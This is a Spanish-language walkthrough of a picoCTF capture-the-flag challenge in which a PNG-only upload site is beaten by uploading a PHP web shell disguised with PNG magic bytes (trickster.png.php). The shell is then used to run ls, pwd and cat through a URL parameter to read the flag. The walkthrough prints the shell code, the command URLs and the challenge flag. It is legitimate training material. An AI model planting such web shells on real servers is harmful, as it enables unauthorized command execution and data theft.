### Descripción
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.
#### Una vez iniciada la instancia del desafío:
I found a web app that can help process images: PNG images only!
Try it [here](http://atlas.picoctf.net:64745/)!
### Solución
Una vez desplegada la instancia del desafío, se hace clic en el enlace mostrado, teniendo la carga del siguiente sitio web: 

![[Pasted image 20250401192116.png]]

En dicho sitio se pueden subir solo imágenes en formato **.png**, donde se realiza una prueba con una respectiva imagen, la cual resulta exitosa, pero como no podemos hacer algo más, ya que si se intenta ingresar a otras secciones del sitio, no deja, se procede a revisar el archivo **robots.txt**, resultando en el siguiente enlace:

```
http://atlas.picoctf.net:64745/robots.txt
```

Una vez colocado en la barra del buscador, nos muestra lo siguiente

```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

Por lo que se prueban ambas opciones, siendo la primera un texto que nos dice que los números mágicos que permiten identificar un archivo .png son "50, 4E, 47", es por eso que se decide consultar ChatGPT para pedirle crear un web shell simple de php, resultando en el siguiente:

```php
PNG
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Una vez guardado como **trickster.png.php**, se procede a subirlo al sitio web, donde como podemos ver en la siguiente imagen se subió de forma correcta:

![[Pasted image 20250401192901.png]]

Una vez cargado en la plataforma, procedemos a ejecutarlo con ayuda del link del sitio web, donde solo se agrega el nombre del archivo, seguido de un signo de cierre de interrogación, por ultimo el comando precedido por *cmd=*, tal como se aprecia en seguida:

```
http://atlas.picoctf.net:64745/uploads/trickster.png.php?cmd=ls
```

Es entonces que se nos presenta esto en pantalla:

![[Pasted image 20250401193326.png]]

Para saber donde nos encontramos, hacemos uso del comando **pwd**, como se aprecia:

```
http://atlas.picoctf.net:64745/uploads/trickster.png.php?cmd=pwd
```

Dándonos el siguiente resultado después de la ejecución del comando:

![[Pasted image 20250401193406.png]]

Se vuelve a emplear el comando **ls** para saber el contenido del directorio donde nos encontramos en ese momento haciendo uso del siguiente link:

```
http://atlas.picoctf.net:64745/uploads/trickster.png.php?cmd=ls%20..
```

Arrojándonos el siguiente resultado en pantalla:

![[Pasted image 20250401193602.png]]

Por último, para ver el contenido del archivo .txt de nombre raro, se emplea el comando **cat**:

http://atlas.picoctf.net:64745/uploads/trickster.png.php?cmd=cat%20../GQ4DOOBVMMYGK.txt

Mostrándonos lo siguiente:

![[Pasted image 20250401193549.png]]

Obteniendo así la bandera que soluciona este reto:

```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}
```
### Notas Adicionales

### Referencias
